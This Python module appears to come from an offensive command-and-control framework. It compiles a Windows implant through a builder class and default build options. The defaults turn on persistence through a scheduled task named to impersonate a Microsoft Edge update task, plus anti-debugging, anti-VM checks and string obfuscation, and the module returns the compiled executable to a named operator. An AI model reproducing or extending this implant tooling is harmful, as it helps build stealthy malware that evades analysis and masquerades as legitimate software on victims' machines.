from dataclasses import dataclass, asdict, field
from typing import Optional
from maliketh.crypto.utils import random_hex
import subprocess
import os
import sys

# Options that can be changed (for the implant) at compile time
# These are the options that are set in the builder
IMPLANT_DEFAULT_BUILD_OPTIONS = {
    "initial_sleep_seconds": 180,  # The number of seconds to sleep before the first checkin
    "schtask_persist": True,  # Use schtasks to maintain persistence
    "use_antidebug": True,  # Use anti-debugging techniques
    "kill_parent": True,  # Kill the parent process after spawning the implant (unused)
    "use_antivm": True,  # Use anti-vm techniques
    "scheduled_task_name": "MicrosoftEdgeUpdateTaskMachineUA",  # Name of the scheduled task
    "register_max_retries": 5,  # Number of times to retry registering before exiting
}

def cleanup_str(s: str) -> str:
    """
    Remove non-alphanumeric characters from a string
    """
    return "".join([c for c in s if c.isalnum()])

@dataclass
class BuilderOptions:
    initial_sleep_seconds: int = field(default=IMPLANT_DEFAULT_BUILD_OPTIONS["initial_sleep_seconds"])
    schtask_persist: bool = field(default=IMPLANT_DEFAULT_BUILD_OPTIONS["schtask_persist"])
    use_antidebug: bool = field(default=IMPLANT_DEFAULT_BUILD_OPTIONS["use_antidebug"])
    kill_parent: bool = field(default=IMPLANT_DEFAULT_BUILD_OPTIONS["kill_parent"])
    use_antivm: bool = field(default=IMPLANT_DEFAULT_BUILD_OPTIONS["use_antivm"])
    scheduled_task_name: str = field(default=IMPLANT_DEFAULT_BUILD_OPTIONS["scheduled_task_name"])
    register_max_retries: int = field(default=IMPLANT_DEFAULT_BUILD_OPTIONS["register_max_retries"])

    def __post_init__(self):
        self.scheduled_task_name = cleanup_str(self.scheduled_task_name)

    def to_dict(self):
        return asdict(self)
    
    @staticmethod
    def from_dict(options: dict):
        return BuilderOptions(**options)

@dataclass
class ImplantBuilder:
    """
    Builder pattern class to programatically compile the implant
    """

    _operator_name: str  # The name of the operator requesting this build
    _builder_options: BuilderOptions = field(default_factory=BuilderOptions)  # The options to use when building the implant

    @property
    def operator_name(self):
        return self._operator_name
    
    @property
    def BuilderOptions(self):
        return self._builder_options

    def operator(self, operator_name: str):
        """
        Set the operator name
        """
        self.operator_name = operator_name
        return self
    
    def with_options(self, options: BuilderOptions):
        """
        Set the build options
        """
        self._builder_options = options
        return self
    
    def initial_sleep_seconds(self, initial_sleep_seconds: int):
        """
        Set the initial sleep time
        """
        self._builder_options.initial_sleep_seconds = initial_sleep_seconds
        return self
    
    def schtask_persist(self, schtask_persist: bool):
        """
        Set the schtask_persist option
        """
        self._builder_options.schtask_persist = schtask_persist
        return self
    
    def use_antidebug(self, use_antidebug: bool):
        """
        Set the use_antidebug option
        """
        self._builder_options.use_antidebug = use_antidebug
        return self
    
    def kill_parent(self, kill_parent: bool):
        """
        Set the kill_parent option
        """
        self._builder_options.kill_parent = kill_parent
        return self
    
    def use_antivm(self, use_antivm: bool):
        """
        Set the use_antivm option
        """
        self._builder_options.use_antivm = use_antivm
        return self
    
    def scheduled_task_name(self, scheduled_task_name: str):
        """
        Set the scheduled_task_name option
        """
        self._builder_options.scheduled_task_name = cleanup_str(scheduled_task_name)
        return self
    
    def register_max_retries(self, register_max_retries: int):
        """
        Set the register_max_retries option
        """
        self._builder_options.register_max_retries = register_max_retries
        return self
    
    def build(self) -> Optional[bytes]:
        """
        Build the implant
        """
        
        # Ensure the build options are valid
        options = self._builder_options.to_dict()
        if any([type(v) == str and len(v) == 0 for v in options.values()]):
            return None
        
        # Create the compiler flags
        compiler_flags = ' '.join(self.__create_compiler_flags())

        # Create the compiler command
        compiler_command = f"BUILDER_OPTS=\"{compiler_flags}\" /implant/build-release.sh"

        # Build the implant
        try:
            return self.__build_implant(compiler_command)
        except subprocess.CalledProcessError as e:
            # Compilation failed for some reason
            print(e)
            return None


    def __create_compiler_flags(self) -> str:
        """
        Create the string of compiler arguments (-D) to pass to the compiler
        """
        for k, v in self._builder_options.to_dict().items():
            if type(v) == bool:
                yield f"-D{k.upper()}={str(v).upper()}"
            elif type(v) == str:
                yield f"-D{k.upper()}='OBFUSCATED(\\\"{cleanup_str(v)}\\\")'"
            else:
                yield f"-D{k.upper()}={v}"
        
    def __build_implant(self, compiler_command: str) -> bytes:
        """
        Build the implant
        """

        filename = f"/implant/{random_hex(16)}.exe"
        compiler_command = f"RELEASE_OUTFILE={filename} {compiler_command}"

        print(compiler_command, file=sys.stderr)
        print(os.getcwd(), file=sys.stderr)
        # Execute compiler command
        subprocess.run(compiler_command, shell=True, check=True, cwd='/implant')

        # Read the compiled implant
        with open(filename, "rb") as f:
            implant_bytes = f.read()

        # Delete the compiled implant
        subprocess.run(f"rm {filename}", shell=True, check=True)

        return implant_bytes





        